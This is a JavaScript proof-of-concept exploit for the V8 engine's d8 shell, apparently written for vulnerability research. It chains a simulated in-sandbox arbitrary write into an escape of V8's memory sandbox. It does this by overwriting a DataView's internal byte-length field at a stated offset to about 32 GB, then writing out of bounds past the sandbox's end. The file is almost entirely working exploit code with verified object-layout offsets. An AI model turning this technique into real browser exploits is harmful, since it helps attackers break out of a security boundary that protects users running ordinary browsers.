'use strict';
// Native Heap Outside Sandbox Escape PoC
//
// CHAIN:
//   Stage 1: in-sandbox arbitrary write  (Sandbox.MemoryView — simulates real in-sandbox JS bug)
//   Stage 2: create MemoryView backed at SB_END - 4 GB (last 4 GB of sandbox VA reservation)
//   Stage 3: corrupt DataView byte_length to 32 GB via in-sandbox write to JSDataView+0x24
//            JSDataView byte_length encoding: field × 8 = JS byteLength  (verified)
//   Stage 4: write at offset > 4 GB → address > SB_END → outside sandbox VA
//
// byte_length layout (verified empirically):
//   JSArrayBuffer: +0x18 (raw_byte_length) and +0x20 (byte_length), encoding: field×8 = byteLength
//   JSDataView:    +0x24 (raw_byte_length),                          encoding: field×8 = byteLength
//
// Run: d8 --expose-memory-corruption-api --allow-natives-syntax

function hex(v) {
  if (typeof v === 'bigint') return '0x' + v.toString(16).padStart(12, '0');
  return '0x' + (v >>> 0).toString(16).padStart(8, '0');
}
function banner(s) { print('\n━━━━━━━ ' + s + ' ━━━━━━━'); }

if (typeof Sandbox === 'undefined') {
  print('[-] Need: --expose-memory-corruption-api --allow-natives-syntax'); quit(1);
}

// Stage 1 primitive: in-sandbox arbitrary R/W over first 4 GB of sandbox
// (In a real exploit: in-sandbox arbitrary write provided by e.g. EPT handle corruption chain)
const sv    = new DataView(new Sandbox.MemoryView(0, 0x100000000));
const r32   = a => sv.getUint32(Number(a), true);
const w32   = (a, v) => sv.setUint32(Number(a), v >>> 0, true);
const SB_BASE = BigInt(Sandbox.base);
const SB_END  = SB_BASE + BigInt(Sandbox.byteLength);
const SB_SIZE = Sandbox.byteLength;  // 1 TB (safe JS Number)

banner('SANDBOX VA RANGE');
print('  base = ' + hex(SB_BASE));
print('  end  = ' + hex(SB_END));
print('  size = ' + (BigInt(SB_SIZE) / (1024n * 1024n * 1024n)) + ' GB');

// ── Stage 2: MemoryView backed at SB_END - 4 GB ──────────────────────
banner('STAGE 2 — MemoryView backed at SB_END - 4 GB');
// NEAR_END_OFFSET = SB_SIZE - 4 GB  → backing_store = SB_BASE + offset = SB_END - 4 GB
const NEAR_END_OFFSET = SB_SIZE - 0x100000000;  // 1 TB - 4 GB (safe JS Number)

const mv_end    = new Sandbox.MemoryView(NEAR_END_OFFSET, 0x100000000);
const mv_end_dv = new DataView(mv_end);  // DataView wrapping the last-4GB MemoryView

// Addresses of both objects in the first-4GB sandbox heap (compressed heap)
const mvAbAddr  = BigInt(Sandbox.getAddressOf(mv_end));     // backing ArrayBuffer
const mvDvAddr  = BigInt(Sandbox.getAddressOf(mv_end_dv));  // the DataView itself

const bs_expected = SB_END - 0x100000000n;  // SB_END - 4 GB

print('  MemoryView(SB_SIZE - 4GB, 4GB) created');
print('  backing_store expected = ' + hex(bs_expected) + '  (= SB_END - 4 GB)');
print('  ArrayBuffer sb_off = ' + hex(mvAbAddr) + '   byte_length field (+0x18) = ' + r32(mvAbAddr + 0x18n));
print('  DataView   sb_off  = ' + hex(mvDvAddr) + '   byte_length field (+0x24) = ' + r32(mvDvAddr + 0x24n));
print('  DataView.byteLength (before) = ' + mv_end_dv.byteLength);

// ── Stage 3: corrupt DataView byte_length to 32 GB ───────────────────
banner('STAGE 3 — Corrupt DataView byte_length to 32 GB via in-sandbox write');
// JSDataView +0x24 = raw_byte_length, encoding: field × 8 = byteLength
// Writing 0xFFFFFFFF: byteLength = 0xFFFFFFFF × 8 ≈ 32 GB
const DV_BL_OFF    = 0x24n;
const INFLATED_VAL = 0xFFFFFFFF;  // 32-bit max → byteLength = ~32 GB

print('  Write 0xFFFFFFFF to mvDvAddr + 0x24  (in-sandbox write to JSDataView.raw_byte_length)');
w32(mvDvAddr + DV_BL_OFF, INFLATED_VAL);
print('  DataView.byteLength (after)  = ' + mv_end_dv.byteLength);
print('  = 0x' + mv_end_dv.byteLength.toString(16));
const inflated_ok = mv_end_dv.byteLength > 0x400000000;  // > 16 GB check
print('  Inflation ' + (inflated_ok ? '✓ CONFIRMED' : '✗ FAILED'));

if (!inflated_ok) {
  print('  [-] byteLength not inflated — aborting');
  quit(1);
}

print('');
print('  Backing_store = SB_END - 4 GB = ' + hex(bs_expected));
print('  With ~32 GB byteLength, max reachable address:');
print('    ' + hex(bs_expected) + ' + 32 GB  =  SB_END + 28 GB  →  OUTSIDE SANDBOX VA');

// ── Stage 4: OOB write outside sandbox VA ────────────────────────────
banner('STAGE 4 — OOB write: target address = SB_END + 4');
// Offset 0x100000004 = 4 GB + 4 bytes past DataView start
// Address = backing_store + offset = (SB_END - 4 GB) + (4 GB + 4) = SB_END + 4
const ESCAPE_OFFSET = 0x100000004;  // 4 GB + 4
const target_addr   = bs_expected + BigInt(ESCAPE_OFFSET);

print('  Escape offset : 0x' + ESCAPE_OFFSET.toString(16) + '  (= 4 GB + 4)');
print('  Target address: ' + hex(target_addr) + '  (= SB_END + 4)');
print('');
print('  SANDBOX VA = [' + hex(SB_BASE) + ', ' + hex(SB_END) + ')');
print('  ' + hex(target_addr) + ' is ' + (target_addr >= SB_END ? 'OUTSIDE ✓' : 'inside (bug in calc?)'));
print('');
print('  mv_end_dv.setUint32(0x100000004, 0xDEADC0DE, true)  ← CRASH NEXT');
print('  → Expected fault address = ' + hex(SB_END + 4n) + '  (outside sandbox VA)');
print('  → Verify fault address vs SANDBOX VA printed above');
mv_end_dv.setUint32(ESCAPE_OFFSET, 0xDEADC0DE, true);
print('  (should not reach here — write to outside-sandbox address should fault)');
